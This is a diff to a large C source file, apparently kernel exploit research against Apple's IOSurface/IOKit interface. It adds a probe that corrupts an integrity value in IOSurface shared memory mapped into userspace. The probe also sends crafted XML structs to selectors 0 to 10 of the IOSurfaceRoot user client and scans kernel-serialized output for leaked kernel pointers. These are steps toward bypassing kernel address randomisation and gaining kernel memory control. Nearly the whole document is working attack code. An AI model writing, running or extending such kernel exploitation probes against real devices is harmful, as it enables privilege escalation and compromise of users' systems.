@@ -16652,6 +16652,294 @@ static void *r424_snoop_thread(void *arg) {
  *    and check for kernel address leaks in service properties.
  */
 
+/*
+ * r426: Shared data manipulation + IOKit s_set_value/s_get_value.
+ *
+ * Key insight: The shared data structure is mapped R/W in userspace.
+ * The integrity check at +88 is ~(addr+0x28). What if we:
+ * 1. Modify the integrity check to encode a different address
+ * 2. Trigger a kernel operation that validates/uses the integrity check
+ * 3. If the kernel uses the decoded address, we control where it reads
+ *
+ * Also try IOConnectCallMethod with crafted struct input to trigger
+ * s_set_value/s_get_value which process OSSerialize XML data.
+ * The selectors for IOSurface external methods are:
+ * 0 = s_create_surface, 1 = s_delete_surface, 2 = s_get_value,
+ * 3 = s_set_value, etc.
+ *
+ * Also try: IOSurfaceCopyAllValues which serializes the entire
+ * property dictionary from kernel space.
+ */
+
+static void r426_probe(void) {
+    rlog("\n=== r426: Shared Data Manipulation + IOKit Methods ===\n\n");
+    fflush(stdout);
+
+    /* ---- Vector A: Modify integrity check, observe kernel behavior ---- */
+    rlog("  Vector A: Shared data integrity modification test\n");
+    {
+        unsigned pixFmt = 'BGRA';
+        const void *kk[] = {
+            kIOSurfaceWidth, kIOSurfaceHeight,
+            kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+            kIOSurfaceAllocSize
+        };
+        int w = 64, h = 64, bpr = 256, as = 16384;
+        CFNumberRef vv[] = {
+            CFNumberCreate(NULL, kCFNumberIntType, &w),
+            CFNumberCreate(NULL, kCFNumberIntType, &h),
+            CFNumberCreate(NULL, kCFNumberIntType, &bpr),
+            CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+            CFNumberCreate(NULL, kCFNumberIntType, &as)
+        };
+        CFDictionaryRef sprops = CFDictionaryCreate(NULL, kk,
+            (const void**)vv, 5,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+
+        IOSurfaceRef surf = IOSurfaceCreate(sprops);
+        uint32_t sid = IOSurfaceGetID(surf);
+        uint64_t clientRef = (uint64_t)surf;
+        uint64_t sharedPtr;
+        memcpy(&sharedPtr, (void *)(clientRef + 8), 8);
+
+        rlog("    Surface id=%u shared=0x%llx\n",
+            sid, (unsigned long long)sharedPtr);
+
+        /* Read original integrity */
+        uint64_t origIntegrity;
+        memcpy(&origIntegrity, (void *)(sharedPtr + 88), 8);
+        rlog("    Original integrity@+88 = 0x%016llx\n",
+            (unsigned long long)origIntegrity);
+
+        /* Set a property BEFORE corruption */
+        CFStringRef testKey = CFSTR("test_before");
+        int testVal = 42;
+        CFNumberRef testNum = CFNumberCreate(NULL, kCFNumberIntType,
+            &testVal);
+        IOSurfaceSetValue(surf, testKey, testNum);
+        CFRelease(testNum);
+
+        /* Read it back */
+        CFNumberRef readBack = (CFNumberRef)IOSurfaceCopyValue(surf,
+            testKey);
+        if (readBack) {
+            int rb = 0;
+            CFNumberGetValue(readBack, kCFNumberIntType, &rb);
+            rlog("    Read before corruption: %d\n", rb);
+            CFRelease(readBack);
+        }
+
+        /* Now corrupt the integrity check */
+        uint64_t fakeIntegrity = origIntegrity ^ 0x1; /* minimal change */
+        memcpy((void *)(sharedPtr + 88), &fakeIntegrity, 8);
+        rlog("    Corrupted integrity@+88 = 0x%016llx\n",
+            (unsigned long long)fakeIntegrity);
+
+        /* Try to set/get a property with corrupted integrity */
+        CFStringRef testKey2 = CFSTR("test_after");
+        testVal = 99;
+        testNum = CFNumberCreate(NULL, kCFNumberIntType, &testVal);
+        IOSurfaceSetValue(surf, testKey2, testNum);
+        CFRelease(testNum);
+
+        readBack = (CFNumberRef)IOSurfaceCopyValue(surf, testKey2);
+        if (readBack) {
+            int rb = 0;
+            CFNumberGetValue(readBack, kCFNumberIntType, &rb);
+            rlog("    Read after corruption: %d (expected 99)\n", rb);
+            CFRelease(readBack);
+        } else {
+            rlog("    Read after corruption: FAILED (NULL)\n");
+        }
+
+        /* Restore integrity */
+        memcpy((void *)(sharedPtr + 88), &origIntegrity, 8);
+        rlog("    Restored integrity\n");
+
+        /* Verify restoration worked */
+        readBack = (CFNumberRef)IOSurfaceCopyValue(surf, testKey);
+        if (readBack) {
+            int rb = 0;
+            CFNumberGetValue(readBack, kCFNumberIntType, &rb);
+            rlog("    Read after restore: %d (expected 42)\n", rb);
+            CFRelease(readBack);
+        }
+
+        CFRelease(surf);
+        CFRelease(sprops);
+        for (int i = 0; i < 5; i++) CFRelease(vv[i]);
+    }
+    fflush(stdout);
+
+    /* ---- Vector B: IOConnectCallMethod with struct input ---- */
+    /* Try to invoke s_get_value (selector 2) and s_set_value (selector 3)
+       with crafted struct input containing IOSurface serialized data */
+    rlog("\n  Vector B: s_get_value/s_set_value via IOConnectCallMethod\n");
+    {
+        io_service_t svc = IOServiceGetMatchingService(
+            kIOMasterPortDefault,
+            IOServiceMatching("IOSurfaceRoot"));
+        if (svc != IO_OBJECT_NULL) {
+            io_connect_t conn = IO_OBJECT_NULL;
+            kern_return_t kr = IOServiceOpen(svc, mach_task_self(),
+                0, &conn);
+            if (kr == KERN_SUCCESS) {
+                /* Create a surface first so we have a valid ID */
+                unsigned pixFmt = 'BGRA';
+                const void *kk2[] = {
+                    kIOSurfaceWidth, kIOSurfaceHeight,
+                    kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+                    kIOSurfaceAllocSize
+                };
+                int w2 = 64, h2 = 64, bpr2 = 256, as2 = 16384;
+                CFNumberRef vv2[] = {
+                    CFNumberCreate(NULL, kCFNumberIntType, &w2),
+                    CFNumberCreate(NULL, kCFNumberIntType, &h2),
+                    CFNumberCreate(NULL, kCFNumberIntType, &bpr2),
+                    CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+                    CFNumberCreate(NULL, kCFNumberIntType, &as2)
+                };
+                CFDictionaryRef sp = CFDictionaryCreate(NULL, kk2,
+                    (const void**)vv2, 5,
+                    &kCFTypeDictionaryKeyCallBacks,
+                    &kCFTypeDictionaryValueCallBacks);
+                IOSurfaceRef s = IOSurfaceCreate(sp);
+                uint32_t sid = IOSurfaceGetID(s);
+                rlog("    Created surface id=%u\n", sid);
+
+                /* Build serialized dict for s_get_value:
+                   {IOSurfaceID: <sid>, IOSurfaceName: "test_key"} */
+                char xmlBuf[1024];
+                snprintf(xmlBuf, sizeof(xmlBuf),
+                    "<dict>"
+                    "<key>IOSurfaceID</key><integer>%u</integer>"
+                    "<key>IOSurfaceName</key>"
+                    "<string>test_key</string>"
+                    "</dict>", sid);
+
+                /* Try selectors 0-10 with this XML as struct input */
+                for (uint32_t sel = 0; sel <= 10; sel++) {
+                    uint8_t outBuf[4096];
+                    size_t outSz = sizeof(outBuf);
+                    memset(outBuf, 0, sizeof(outBuf));
+
+                    kr = IOConnectCallStructMethod(conn, sel,
+                        xmlBuf, strlen(xmlBuf) + 1,
+                        outBuf, &outSz);
+                    if (kr == KERN_SUCCESS) {
+                        rlog("    sel=%u: SUCCESS outSz=%zu\n",
+                            sel, outSz);
+                        /* Scan output for kernel pointers */
+                        for (size_t off = 0; off + 7 < outSz; off += 8) {
+                            uint64_t v;
+                            memcpy(&v, outBuf + off, 8);
+                            if (v != 0 && off < 64) {
+                                rlog("      +%zu: 0x%016llx%s\n", off,
+                                    (unsigned long long)v,
+                                    ((v >> 32) >= 0xFFFFFFF0ULL) ?
+                                        " ***KERNEL***" : "");
+                            }
+                        }
+                    } else if (kr != 0xe00002c2) { /* not kIOReturnBadArgument */
+                        rlog("    sel=%u: kr=0x%x\n", sel, kr);
+                    }
+                }
+
+                CFRelease(s);
+                CFRelease(sp);
+                for (int i = 0; i < 5; i++) CFRelease(vv2[i]);
+                IOServiceClose(conn);
+            }
+            IOObjectRelease(svc);
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector C: CopyAllValues deep scan ---- */
+    rlog("\n  Vector C: IOSurfaceCopyAllValues kernel serialization\n");
+    {
+        unsigned pixFmt = 'BGRA';
+        const void *kk[] = {
+            kIOSurfaceWidth, kIOSurfaceHeight,
+            kIOSurfaceBytesPerRow, kIOSurfacePixelFormat,
+            kIOSurfaceAllocSize
+        };
+        int w = 64, h = 64, bpr = 256, as = 16384;
+        CFNumberRef vv[] = {
+            CFNumberCreate(NULL, kCFNumberIntType, &w),
+            CFNumberCreate(NULL, kCFNumberIntType, &h),
+            CFNumberCreate(NULL, kCFNumberIntType, &bpr),
+            CFNumberCreate(NULL, kCFNumberIntType, &pixFmt),
+            CFNumberCreate(NULL, kCFNumberIntType, &as)
+        };
+        CFDictionaryRef sprops = CFDictionaryCreate(NULL, kk,
+            (const void**)vv, 5,
+            &kCFTypeDictionaryKeyCallBacks,
+            &kCFTypeDictionaryValueCallBacks);
+
+        IOSurfaceRef surf = IOSurfaceCreate(sprops);
+
+        /* Set many properties with large values */
+        for (int i = 0; i < 50; i++) {
+            char ks[32];
+            snprintf(ks, sizeof(ks), "bigprop_%d", i);
+            CFStringRef k = CFStringCreateWithCString(NULL, ks,
+                kCFStringEncodingASCII);
+            uint8_t bigData[512];
+            memset(bigData, (uint8_t)(i & 0xFF), sizeof(bigData));
+            CFDataRef d = CFDataCreate(NULL, bigData, sizeof(bigData));
+            IOSurfaceSetValue(surf, k, d);
+            CFRelease(k);
+            CFRelease(d);
+        }
+
+        /* CopyAllValues — the kernel serializes everything */
+        CFDictionaryRef allVals = IOSurfaceCopyAllValues(surf);
+        if (allVals) {
+            CFIndex count = CFDictionaryGetCount(allVals);
+            rlog("    CopyAllValues: %ld properties\n", (long)count);
+
+            /* Serialize to XML plist and scan */
+            CFDataRef xmlData = CFPropertyListCreateData(NULL,
+                allVals, kCFPropertyListXMLFormat_v1_0, 0, NULL);
+            if (xmlData) {
+                const uint8_t *bytes = CFDataGetBytePtr(xmlData);
+                CFIndex len = CFDataGetLength(xmlData);
+                rlog("    XML plist size: %ld bytes\n", (long)len);
+
+                /* Scan raw bytes for kernel pointer patterns */
+                int kernelFound = 0;
+                for (CFIndex off = 0; off + 7 < len; off++) {
+                    uint64_t v;
+                    memcpy(&v, bytes + off, 8);
+                    if ((v >> 36) == 0xFFFFFFF &&
+                        v != 0xFFFFFFFFFFFFFFFF) {
+                        rlog("    *** XML +%ld: 0x%016llx KERNEL ***\n",
+                            (long)off, (unsigned long long)v);
+                        kernelFound++;
+                        if (kernelFound >= 10) break;
+                    }
+                }
+                if (!kernelFound)
+                    rlog("    No kernel pointers in XML plist\n");
+                CFRelease(xmlData);
+            }
+            CFRelease(allVals);
+        } else {
+            rlog("    CopyAllValues returned NULL\n");
+        }
+
+        CFRelease(surf);
+        CFRelease(sprops);
+        for (int i = 0; i < 5; i++) CFRelease(vv[i]);
+    }
+    fflush(stdout);
+
+    rlog("\n=== r426 complete ===\n");
+    fflush(stdout);
+}
+
 static void r425_probe(void) {
     rlog("\n=== r425: IOSurface UserClient + OSSerializer ===\n\n");
     fflush(stdout);
@@ -72764,6 +73052,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 429) {
+            rlog("*** rounds=429: Shared Data Manipulation + IOKit s_get/set ***\n");
+            rlog("  Integrity corruption test, IOConnectCallMethod with XML, CopyAllValues.\n\n");
+            fflush(stdout);
+            r426_probe();
+            goto done;
+        }
         if (rounds == 428) {
             rlog("*** rounds=428: IOSurface UserClient + Context + Registry ***\n");
             rlog("  IOConnectCallMethod, mach_port_get_context, IORegistry, MapMemory.\n\n");
@@ -75352,7 +75647,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411 && rounds != 412 && rounds != 413 && rounds != 414 && rounds != 415 && rounds != 416 && rounds != 417 && rounds != 418 && rounds != 419 && rounds != 420 && rounds != 421 && rounds != 422 && rounds != 423 && rounds != 424 && rounds != 425 && rounds != 426 && rounds != 427 && rounds != 428 && rounds != 429) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
